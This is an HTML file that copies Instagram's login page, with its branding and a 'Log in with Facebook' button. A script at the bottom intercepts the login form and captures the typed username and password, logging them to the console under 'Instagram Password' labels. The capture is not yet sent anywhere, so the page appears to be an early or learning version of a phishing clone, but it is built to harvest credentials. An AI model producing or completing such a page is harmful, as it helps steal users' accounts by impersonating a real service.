<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram</title>
  <link rel="stylesheet" href="style.css" />
  <!-- Remove the .zip link below -->
  <!-- <link rel="stylesheet" href="billabong.zip"> -->
</head>
<body>

  <div class="login-wrapper">
    <div class="login-box">

      <h1 class="logo-text">Instagram</h1>

      <!-- Added id="loginForm" -->
      <form id="loginForm" class="login-form">
        <!-- Added id="username" and id="password" -->
        <input type="text" id="username" placeholder="Phone number, username, or email" required />
        <input type="password" id="password" placeholder="Password" required />
        <button type="submit">Log In</button>
      </form>

      <div class="divider"><span>OR</span></div>

      <button class="fb-login-btn">
        <svg aria-label="Facebook" fill="#385185" height="16" viewBox="0 0 24 24" width="16">
          <path d="M22.675 0H1.325C.593 0 0 .593 0 1.326v21.348C0 23.407.593 24 1.325 24H12.82v-9.294H9.692v-3.622h3.128V8.413c0-3.1 1.894-4.788 4.659-4.788 1.325 0 2.466.099 2.797.143v3.24l-1.918.001c-1.504 0-1.796.715-1.796 1.763v2.313h3.59l-.467 3.622h-3.123V24h6.116c.73 0 1.324-.593 1.324-1.326V1.326C24 .593 23.407 0 22.675 0z"></path>
        </svg>
        Log in with Facebook
      </button>

      <a href="#" class="forgot-pass">Forgot password?</a>

    </div>

    <div class="signup-box">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
  </div>

<!-- JavaScript yahin likho, script tag ke andar -->
<script>
  document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    console.log("⚠️ Instagram Username:", username);
    console.log("⚠️ Instagram Password:", password);
  });
</script>

</body>
</html>
